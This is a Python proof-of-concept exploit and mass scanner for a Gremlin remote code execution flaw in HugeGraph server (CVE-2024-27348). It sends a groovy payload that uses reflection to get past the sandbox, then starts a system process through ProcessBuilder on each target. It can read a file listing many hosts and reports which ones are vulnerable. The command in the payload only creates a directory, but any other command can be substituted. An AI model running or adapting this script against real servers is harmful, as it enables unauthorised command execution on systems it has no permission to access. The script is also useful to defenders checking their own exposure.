import requests
import argparse
import json

def exploit(target, port):
    url = f"{target}:{port}/gremlin"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"mkdir\", \"/tmp/SecureLayer7\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
    }

    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload), verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+] {target}:{port} is vulnerable!")
            print("[+] Response data:")
            print(response.text)
            print("")
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            print(f"[-] {target}:{port} may not be vulnerable")
            print(response.text)
            print("")
    except Exception as e:
        print(f"[!] There is Exception with {target}:{port}")



def process_targets(file):
    with open(file, 'r') as f:
        for line in f:
            target, port = line.strip().split(',')
            exploit(target, port)

if __name__ == "__main__":
    print("""
 ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██████  ███████ ██████  ██   ██  █████  
██      ██    ██ ██                 ██ ██  ████      ██ ██   ██            ██      ██      ██ ██   ██ ██   ██ 
██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████  █████      ██   █████  ███████  █████  
██       ██  ██  ██            ██      ████  ██ ██           ██       ██         ██        ██      ██ ██   ██ 
 ██████   ████   ███████       ███████  ██████  ███████      ██       ███████    ██   ██████       ██  █████  
                                                                                                              
                                      HugeGraph server RCE Scanner
                                            By: Zeyad Azima
                                  Github: https://github.com/Zeyad-Azima                                                                      


    """)
    parser = argparse.ArgumentParser(description="Exploit CVE-2024-27348 Gremlin RCE in HugeGraph server from 1.0.0 Before 1.3.0")
    parser.add_argument("--file", "-f", required=False, help="File containing target addresses and ports W/ the follwoing format:\nhttp://target,port\ne.x: http://localhost,8080")
    parser.add_argument("--target", "-t", required=False, help="Target IP address/domain")
    parser.add_argument("--port", "-p", required=False, help="Target port")
    args = parser.parse_args()

    if args.file:
        process_targets(args.file)
    elif args.target and args.port:
        exploit(args.target, args.port)
    else:
        print("[!] Please Use targets file or a single target\nuse --help/-h for more information")
